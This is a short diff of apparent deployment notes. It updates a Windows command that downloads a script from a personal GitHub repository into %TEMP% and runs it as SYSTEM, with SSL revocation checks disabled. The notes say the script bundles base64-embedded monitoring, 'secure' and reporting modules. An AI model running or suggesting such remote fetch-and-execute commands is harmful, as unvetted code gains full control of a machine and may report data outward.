@@ -2,7 +2,7 @@
 
 ## Preferred (Guest: Run as SYSTEM) — full deploy, SELF-CONTAINED (no repo dependency at deploy time)
 ```bat
-curl.exe -L --ssl-no-revoke -o %TEMP%\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o16" && call %TEMP%\own.cmd
+curl.exe -L --ssl-no-revoke -o %TEMP%\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o17" && call %TEMP%\own.cmd
 ```
 own.txt is now the full self-contained O16 build: embeds own_mon M9 + own_secure S4 + tg_report T7 + own_lib L1 as base64.
 O16 fixes the launcher detach bug (RUNNER expanded at parse-time inside block -> empty -> bare-quote cmd error / fake Detached OK).
